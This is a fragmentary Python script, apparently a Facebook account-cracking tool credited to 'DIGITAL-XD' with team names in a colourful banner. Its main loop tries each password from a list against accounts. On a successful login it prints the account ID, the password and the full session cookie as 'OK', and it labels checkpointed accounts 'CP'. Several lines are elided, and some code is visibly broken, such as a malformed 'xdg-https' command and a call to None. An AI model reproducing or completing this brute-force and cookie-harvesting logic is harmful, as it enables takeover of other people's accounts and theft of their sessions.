...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/abu.kaiam.5059')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-https://www.facebook.com/abu.kaiam.5059' )
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
\033[1;37m================= \33[32;45mKING\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mDIGITAL-XD
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MD LIMON TALUKDER 
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mDIGITAL-XD
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS OK
\033[1;32m     \033[1;35mTEAM         :  \033[1;35m JIBON/LIMON/JIHAD
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mMR\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO DIGITAL-XD TOOLS\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(LIMON-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(LIMON-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[LIMON] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
